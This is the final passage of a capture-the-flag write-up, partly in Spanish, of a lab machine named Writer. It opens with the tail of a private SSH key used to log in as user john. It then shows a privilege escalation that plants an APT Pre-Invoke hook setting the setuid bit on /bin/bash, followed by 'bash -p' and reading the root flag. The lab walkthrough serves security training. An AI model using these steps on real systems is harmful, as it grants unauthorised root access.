9IQ9fe70S/A8RZ7et6S9NHMfYTNFXAX5sP5iMzwg8HvqsOSt9KULldwtd7zXyEsXGQ/5LM
VrL6KMJfZBm2eBkvzzQAYrNtODNMlhYk/3AFKjsOK6USwYJj3Lio55+vZQVcW2Hwj/zhH9
0J8msCLhXLH57CA4Ex1WCTkwOc35sz+IET+VpMgidRwd1b+LSXQPhYnRAUjlvtcfWdikVt
2+itVvkgbayuG7JKnqA4IQTrgoJuC/s4ZT4M8qh4SuN/ANHGohCuNsOcb5xp/E2WmZ3Gcm
bB0XE4BEhilAWLts4yexGrQ9So+eAXnfWZHRObhugy88TGy4v05B3z955EWDFnrJX0aMXn
l6N71m/g5XoYJ6hu5tazJtaHrZQsD5f71DCTLTSe1ZMwea6MnPisV8O7PC/PFIBP+5mdPf
3RXx0i7i5rLGdlTGJZUa+i/vGObbURyd5EECiS/Lpi0dnmUJKcgEKpf37xQgrFpTExAAAA
wQDY6oeUVizwq7qNRqjtE8Cx2PvMDMYmCp4ub8UgG0JVsOVWenyikyYLaOqWr4gUxIXtCt
A4BOWMkRaBBn+3YeqxRmOUo2iU4O3GQym3KnZsvqO8MoYeWtWuL+tnJNgDNQInzGZ4/SFK
23cynzsQBgb1V8u63gRX/IyYCWxZOHYpQb+yqPQUyGcdBjpkU3JQbb2Rrb5rXWzUCzjQJm
Zs9F7wWV5O3OcDBcSQRCSrES3VxY+FUuODhPrrmAtgFKdkZGYAAADBAPSpB9WrW9cg0gta
9CFhgTt/IW75KE7eXIkVV/NH9lI4At6X4dQTSUXBFhqhzZcHq4aXzGEq4ALvUPP9yP7p7S
2BdgeQ7loiRBng6WrRlXazS++5NjI3rWL5cmHJ1H8VN6Z23+ee0O8x62IoYKdWqKWSCEGu
dvMK1rPd3Mgj5x1lrM7nXTEuMbJEAoX8+AAxQ6KcEABWZ1xmZeA4MLeQTBMeoB+1HYYm+1
3NK8iNqGBR7bjv2XmVY6tDJaMJ+iJGdQAAAMEAz9h/44kuux7/DiyeWV/+MXy5vK2sJPmH
Q87F9dTHwIzXQyx7xEZN7YHdBr7PHf7PYd4zNqW3GWL3reMjAtMYdir7hd1G6PjmtcJBA7
Vikbn3mEwRCjFa5XcRP9VX8nhwVoRGuf8QmD0beSm8WUb8wKBVkmNoPZNGNJb0xvSmFEJ/
BwT0yAhKXBsBk18mx8roPS+wd9MTZ7XAUX6F2mZ9T12aIYQCajbzpd+fJ/N64NhIxRh54f
Nwy7uLkQ0cIY6XAAAAC2pvaG5Ad3JpdGVyAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```

```bash
❯ chmod 600 id_rsa
```

```bash
❯ ssh -i id_rsa john@10.10.11.101
```

```ruby
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 2.0

 * Pure upstream Kubernetes 1.21, smallest, simplest cluster ops!

     https://microk8s.io/

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Jul 28 09:19:58 2021 from 10.10.14.19
john@writer:~$
```

- List groups

```bash
john@writer:~$ id
```

```ruby
uid=1001(john) gid=1001(john) groups=1001(john),1003(management)
```

```bash
john@writer:~$ find / -group management 2>/dev/null
```

```ruby
/etc/apt/apt.conf.d
```

> En esta ruta se configura el funcionamiento al usar el comando apt. Si nos fijamos, anteriormente vimos que el usuario root ejecutaba un apt update, sabiendo esto, podemos modificar los archivos para ejecutar algún comando antes de tiempo.

```bash
john@writer:~$ nano /etc/apt/apt.conf.d/test
```

```ruby
APT::Update::Pre-Invoke {"chmod u+s /bin/bash"; };
```

```bash
john@writer:/etc/apt/apt.conf.d$ ls -la /bin/bash
```

```ruby
-rwsr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
```

```bash
john@writer:/etc/apt/apt.conf.d$ bash -p
```

```ruby
bash-5.0# cat /root/root.txt 
3163ba867f0a92d4f6e7ff5a2a461ccf
```


![](/img2/Pasted%20image%2020250628003544.png)